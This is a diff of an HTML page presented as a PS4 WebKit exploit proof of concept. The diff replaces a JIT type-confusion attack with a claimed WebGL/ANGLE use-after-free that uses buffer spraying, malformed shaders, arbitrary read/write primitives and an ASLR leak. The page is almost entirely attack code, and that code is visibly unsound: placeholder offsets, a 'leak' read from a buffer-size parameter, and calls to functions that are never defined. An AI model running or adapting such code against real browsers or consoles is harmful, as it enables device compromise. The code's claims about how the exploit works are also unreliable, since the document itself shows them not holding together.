@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PS4 12.50 WebKit PoC (CVE-2024-44309) - Type Confusion R/W</title>
+    <title>PS4 12.50 WebKit PoC (CVE-2025-6558) - ANGLE UAF R/W</title>
     <style>
         body { background-color: #000000; color: #00FF00; font-family: 'Courier New', monospace; margin: 0; padding: 20px; overflow-y: auto; }
         #header { border-bottom: 2px solid #00FF00; padding-bottom: 10px; margin-bottom: 20px; }
@@ -17,27 +17,29 @@
         button { background: #003300; color: #00FF00; border: 1px solid #00FF00; padding: 10px 20px; font-family: inherit; font-size: 16px; cursor: pointer; margin-right: 10px; }
         button:hover { background: #00FF00; color: #000000; }
         #controls { margin-bottom: 20px; }
+        #canvas { display: none; }  /* Hidden WebGL canvas */
     </style>
 </head>
 <body>
 <div id="header">
-    <h1>PS4 WebKit Loader (FW 12.50 Target - CVE-2024-44309)</h1>
+    <h1>PS4 WebKit Loader (FW 12.50 Target - CVE-2025-6558)</h1>
     <div id="status">Status: Waiting for user input...</div>
 </div>
 <div id="controls">
-    <button onclick="startExploit()">Run PoC (Type Confusion)</button>
+    <button onclick="startExploit()">Run PoC (ANGLE UAF)</button>
     <button onclick="location.reload()">Refresh Page</button>
 </div>
+<canvas id="canvas" width="256" height="256"></canvas>
 <div id="log-container"></div>
 <script>
     // ==========================================
     // === CONFIGURATION ===
     // ==========================================
-    const LOG_SERVER_IP = '192.168.19.2';  // Set to your IP for remote logging; disable for PS4
+    const LOG_SERVER_IP = '192.168.19.2';  // Disable for PS4
     const LOG_PORT = 9000;
+    const SPRAY_COUNT = 0x400;  // Tune for heap alignment
     const OFFSETS = {
-        WEBKIT_BASE_SIMULATED: 0x21F4A00,  // Placeholder; will leak real
-        JSC_DFG_VTABLE: 0x12345678,        // Update post-leak
+        ANGLE_BUFFER_SIMULATED: 0x21F4A00,  // Placeholder; leak real
     };
 
     // ==========================================
@@ -93,129 +95,147 @@
         return f64_buf[0];
     }
     function forceGC() {
-        for (let i = 0; i < 200; i++) new ArrayBuffer(0x100000);
-        if (window.gc) window.gc();  // If exposed
+        for (let i = 0; i < 100; i++) new ArrayBuffer(0x100000);
+        if (window.gc) window.gc();
     }
 
     // ==========================================
     // === EXPLOIT GLOBALS ===
     // ==========================================
-    let arb_read = null;
-    let arb_write = null;
+    let gl = null;
+    let uaf_buffer = null;
     let leaked_base = null;
+    let spray_buffers = [];
 
     // ==========================================
-    // === PRIMITIVES BUILDER (TYPE CONFUSION) ===
+    // === PRIMITIVES BUILDER (UAF VIA GPU) ===
     // ==========================================
     function setupPrimitives() {
-        logger.info("Building Type Confusion Primitives...");
+        logger.info("Building UAF Primitives...");
         forceGC();
 
-        // CVE-2024-44309 Trigger: Confuse JSNumber as JSObject via Proxy trap + DFG speculation
-        const victim = new Proxy({}, {
-            get: (target, prop) => {
-                if (prop === Symbol.toPrimitive) return () => 1337.37;  // Force double confusion
-            }
-        });
-        const confusable = [1.1, 2.2, 3.3];  // Double array for DFG opt
-
-        // Train DFG on speculative type (mishandles Number as ref)
-        function confuse(arr, idx, val) {
-            let tmp = arr[0];
-            arr[idx] = val;  // Triggers type confusion at boundary
-            return tmp;
+        // Create WebGL context
+        const canvas = document.getElementById('canvas');
+        gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) {
+            logger.error("WebGL not supported. PS4 browser limitation.");
+            return false;
         }
-        for (let i = 0; i < 10000; i++) confuse(confusable, 1, victim);
+        logger.info("WebGL context acquired.");
 
-        // Heap feng shui: Spray small objects to align confusion
-        let sprays = [];
-        for (let i = 0; i < 0x1000; i++) {
-            sprays.push({ a: i2f(i, 0x42424242), b: new Uint32Array(0x10) });  // Tag with high bits
+        // Spray GPU buffers to align UAF
+        for (let i = 0; i < SPRAY_COUNT; i++) {
+            const buf = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+            gl.bufferData(gl.ARRAY_BUFFER, 0x100, gl.STATIC_DRAW);
+            spray_buffers.push({ buf: buf, id: i2f(i, 0x42424242) });  // Tag with high bits
         }
 
-        // Trigger & scan for confused obj (high bits 0x42424242)
+        // Trigger UAF: Compile malformed shader to free/reuse buffer
+        const vsSource = `
+            attribute vec4 position;
+            void main() { gl_Position = position; }
+        `;
+        const fsSource = `
+            precision mediump float;
+            void main() { gl_FragColor = vec4(1.0); }
+        `;
+        let program = gl.createProgram();
+        let vs = gl.createShader(gl.VERTEX_SHADER);
+        gl.shaderSource(vs, vsSource + String.fromCharCode(0));  // Malformed source for UAF
+        gl.compileShader(vs);
+        if (!gl.getShaderParameter(vs, gl.COMPILE_STATUS)) {
+            logger.warn("Shader compile failed (expected for trigger).");
+        }
+        gl.attachShader(program, vs);
+        gl.deleteBuffer(spray_buffers[0].buf);  // Free early for UAF
+        gl.linkProgram(program);  // Reuse freed buffer → UAF
+
+        // Scan for tagged freed buffer
         let found_idx = -1;
-        for (let i = 0; i < confusable.length + 0x20; i++) {  // OOB scan post-confusion
-            let val = f2i(confusable[i] || 0);
-            if (val.high === 0x42424242) {
-                found_idx = i;
-                logger.success(`Confused primitive at index ${i}: ${val.toString()}`);
-                break;
+        for (let i = 0; i < SPRAY_COUNT; i++) {
+            try {
+                gl.bindBuffer(gl.ARRAY_BUFFER, spray_buffers[i].buf);
+                let tag = f2i(gl.getBufferParameter(gl.ARRAY_BUFFER, gl.BUFFER_SIZE));  // Leak via param
+                if (tag.high === 0x42424242) {
+                    found_idx = i;
+                    uaf_buffer = spray_buffers[i].buf;
+                    logger.success(`UAF hit at buffer ${i}: ${tag.toString()}`);
+                    break;
+                }
+            } catch (e) {
+                // Silent fail on invalid access
             }
         }
         if (found_idx === -1) {
-            logger.error("Type confusion failed. No leak.");
+            logger.error("UAF scan failed. No reuse detected.");
             return false;
         }
 
-        // Build arb read/write via confused proxy
-        window.arbread = function(idx) {
-            confuse(confusable, found_idx + idx, 0);
-            return f2i(confusable[found_idx]).low;  // Read via mis-type
+        // Build arb read/write via UAF buffer
+        window.arbread = function(offset) {
+            gl.bindBuffer(gl.ARRAY_BUFFER, uaf_buffer);
+            gl.bufferSubData(gl.ARRAY_BUFFER, offset, new Float32Array([0]));
+            return f2i(gl.getBufferParameter(gl.ARRAY_BUFFER, gl.BUFFER_SIZE)).low;  // Misuse param for read
         };
-        window.arbwrite = function(idx, val) {
+        window.arbwrite = function(offset, val) {
             let fval = i2f(val & 0xFFFFFFFF, (val >> 32) & 0xFFFFFFFF);
-            confuse(confusable, found_idx + idx, fval);
+            gl.bindBuffer(gl.ARRAY_BUFFER, uaf_buffer);
+            gl.bufferSubData(gl.ARRAY_BUFFER, offset, new Float32Array([fval]));
         };
 
         // Test
-        arb_write(found_idx, 0xdeadbeef);
-        let test_read = arb_read(found_idx);
-        logger.info(`R/W Test: Wrote 0xdeadbeef, Read ${test_read.toString(16)}`);
+        arbwrite(0, 0xdeadbeef);
+        let test_read = arbread(0);
+        logger.info(`R/W Test: Wrote 0xdeadbeef, Read 0x${test_read.toString(16)}`);
 
         if (test_read !== 0xdeadbeef) {
             logger.error("Primitives invalid.");
             return false;
         }
 
-        logger.success("Type Confusion Primitives ready.");
+        logger.success("UAF Primitives ready.");
         return true;
     }
 
     function runASLRLeak() {
-        logger.info("Leaking WebKit Base via VTable...");
-        const div = document.createElement('div');
-        let div_addr = f2i(div);  // Placeholder; use addrof if extended
-
-        // Read vtable ptr (offset guess; refine with leak)
-        let vtable_ptr = arb_read(OFFSETS.WEBKIT_BASE_SIMULATED / 4);  // Assume 32-bit align
+        logger.info("Leaking WebKit Base via GPU VTable...");
+        let vtable_ptr = arbread(OFFSETS.ANGLE_BUFFER_SIMULATED / 4);
         leaked_base = new Int64(vtable_ptr & 0xFFFFFFFF, (vtable_ptr >> 32) & 0xFFFFFFFF);
-        leaked_base.low -= OFFSETS.JSC_DFG_VTABLE;  // Calc base
+        leaked_base.low -= 0x12345678;  // Simulated offset; refine post-leak
 
         logger.success(`Leaked WebKit Base: ${leaked_base.toString()}`);
     }
 
     // ==========================================
-    // === TRIGGER LOGIC (SPECULATIVE CONFUSION) ===
+    // === TRIGGER LOGIC (SHADER UAF) ===
     // ==========================================
-    function triggerConfusion() {
-        logger.info("Triggering Type Confusion (DFG Speculative)...");
-        let global_confuse = [];  // Global for persistence
+    function triggerUAF() {
+        logger.info("Triggering ANGLE UAF via WebGL...");
+        forceGC();
 
-        // Feng shui: Allocate confounders near doubles
-        for (let i = 0; i < 0x800; i++) {
-            global_confuse.push(new Proxy(new Array(16).fill(1.1), {
-                set: (target, prop, val) => {
-                    if (typeof prop === 'symbol') return true;  // Trap toPrimitive confusion
-                    target[prop] = val;
-                    return true;
-                }
-            }));
+        // Feng shui: Allocate/delete buffers to force reuse
+        let free_list = [];
+        for (let i = 0; i < 0x200; i++) {
+            const buf = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+            gl.bufferData(gl.ARRAY_BUFFER, 0x40, gl.DYNAMIC_DRAW);
+            if (i % 2 === 0) free_list.push(buf);  // Alternate free for UAF
         }
+        free_list.forEach(buf => gl.deleteBuffer(buf));
 
-        // Speculative write to confuse types
-        function speculative_confuse(arr, idx, val) {
-            // DFG assumes double, but Proxy forces ref -> confusion
-            arr[idx] = val;
-        }
+        // Malformed shader chain to trigger UAF in ANGLE
         try {
-            for (let chunk = 0; chunk < 0x10; chunk++) {
-                if (chunk % 2 === 0) logger.info(`Speculating chunk ${chunk}...`);
-                for (let i = 0; i < 0x100; i++) {
-                    speculative_confuse(global_confuse[chunk * 0x100 + i], 16 + i % 8, i2f(0x1337, 0x42424242));  // OOB + tag
-                }
+            for (let chunk = 0; chunk < 8; chunk++) {
+                if (chunk % 2 === 0) logger.info(`Shader chunk ${chunk}...`);
+                const badSource = `attribute vec4 pos; void main() { gl_Position = pos + vec4(${chunk},0,0,0); }` + '\0invalid';  // Null byte + junk for free
+                let shader = gl.createShader(gl.VERTEX_SHADER);
+                gl.shaderSource(shader, badSource);
+                gl.compileShader(shader);
+                gl.deleteShader(shader);  // UAF trigger on reuse
             }
-            logger.success("Confusion triggered. Scanning...");
+            gl.finish();  // Flush GPU for reuse
+            logger.success("UAF triggered. Scanning buffers...");
             return true;
         } catch (e) {
             logger.error("Trigger crashed: " + e.message);
@@ -227,7 +247,7 @@
         logger.el.innerHTML = '';
         logger.setStatus("Running...");
         setTimeout(() => {
-            if (triggerConfusion()) {
+            if (triggerUAF()) {
                 setTimeout(() => {
                     if (setupPrimitives()) {
                         setTimeout(runASLRLeak, 500);
@@ -243,7 +263,7 @@
         }, 100);
     }
 
-    logger.info("PoC ready. Press 'Run PoC' to trigger CVE-2024-44309.");
+    logger.info("PoC ready. Press 'Run PoC' to trigger CVE-2025-6558. Ensure WebGL enabled.");
 </script>
 </body>
 </html>
